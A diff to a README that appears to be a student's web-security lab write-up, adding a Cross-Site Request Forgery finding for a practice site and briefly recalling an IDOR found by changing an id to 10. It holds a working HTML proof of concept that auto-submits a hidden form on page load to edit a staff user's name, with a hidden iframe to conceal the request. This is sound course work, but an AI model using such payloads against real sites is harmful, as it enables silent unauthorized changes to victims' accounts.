@@ -51,7 +51,25 @@ Vulnerability #1: Insecure Direct Object Reference
   		 <img src="Red - Insecure Direct Object Reference.gif" width="800">
   - [x] Steps to recreate: 
   	- When inspecting the Salesperson listing, I noticed that the IDs listed only go up to 9. So I tested for "id=10" and was able to access the corresponding salesperson on the Red website.
-Vulnerability #2: __________________
+
+Vulnerability #2: Cross-Site Request Forgery
+  - [x] GIF Walkthrough: 
+  		 <img src="Red - CSRF.gif" width="800">
+  - [x] Steps to recreate: 
+  	- I wrote a HTML file with the following sourcecode (also in the repository):
+  			"<html>
+				<head>
+					<title> Hello World! </title>
+				</head>
+				<body onload="document.forms[0].submit()">
+					<form id="form" target="res" action="https://35.225.125.173/red/public/staff/users/edit.php?id=1" method="post">
+						<input type="hidden" name="first_name" value="CSRF">
+						<input type="hidden" name="last_name" value="Attack">
+					</form>
+					<iframe name="res" style="display: none;"></iframe>
+				</body>
+			</html>"
+	- The HTML file (which I hosted on WPDistillery as an easy access point) executes when loaded, which will edit the first and last name of the Users on the page. In this instance, I targeted Jon Monroe. However, the admin can't tell that anything was submitted or that any information was changed until they look at the User's page. 
 
 
 ## Notes
